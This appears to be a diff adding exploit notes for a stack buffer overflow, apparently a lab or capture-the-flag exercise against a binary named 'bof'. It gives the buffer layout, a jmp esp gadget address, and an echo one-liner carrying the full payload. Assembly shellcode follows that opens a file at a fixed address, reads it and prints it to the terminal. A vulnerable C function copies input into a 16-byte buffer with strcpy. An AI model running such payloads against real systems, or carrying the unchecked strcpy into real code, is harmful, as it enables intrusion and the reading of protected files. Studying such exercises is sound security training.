@@ -1,0 +1,59 @@
+
+; https://defuse.ca/online-x86-assembler.htm
+
+; [16 bytes buffer] [4 bytes ebp] [4 bytes return] [... bytes shellcode]
+
+; jmp esp @ 0x08048526 (\x26\x85\x04\x08)
+
+; filename @ 0x08049b12
+
+; echo -en "AAAAAAAAAAAAAAAABBBB\x26\x85\x04\x08\xB8\x05\x00\x00\x00\xBB\x12\x9B\x04\x08\xB9\x00\x00\x00\x00\xBA\x00\x00\x00\x00\xCD\x80\x89\xC3\xB8\x03\x00\x00\x00\xB9\x12\x9B\x04\x08\xBA\x1E\x00\x00\x00\xCD\x80\xB8\x04\x00\x00\x00\xBB\x01\x00\x00\x00\xB9\x12\x9B\x04\x08\xBA\x1E\x00\x00\x00\xCD\x80\xB8\x01\x00\x00\x00\xBB\x00\x00\x00\x00\xCD\x80" | bof
+
+; Currently this shellcode is 75 bytes, and contains NULLs (0x00).
+
+; sys_open file
+mov eax, 5
+mov ebx, 0x08049b12
+mov ecx, 0
+mov edx, 0
+int 0x80
+
+; sys_read from file into memory
+mov ebx, eax
+mov eax, 3
+mov ecx, 0x08049b12
+mov edx, 30
+int 0x80
+
+; sys_write memory to terminal
+mov eax, 4
+mov ebx, 1
+mov ecx, 0x08049b12
+mov edx, 30
+int 0x80
+
+; sys_exit
+mov eax, 1
+mov ebx, 0
+int 0x80
+
+
+void bof_func() {
+
+	char a[16];
+	
+	strcpy(a, user);
+
+}
+
+
+
+
+
+
+
+
+
+
+
+
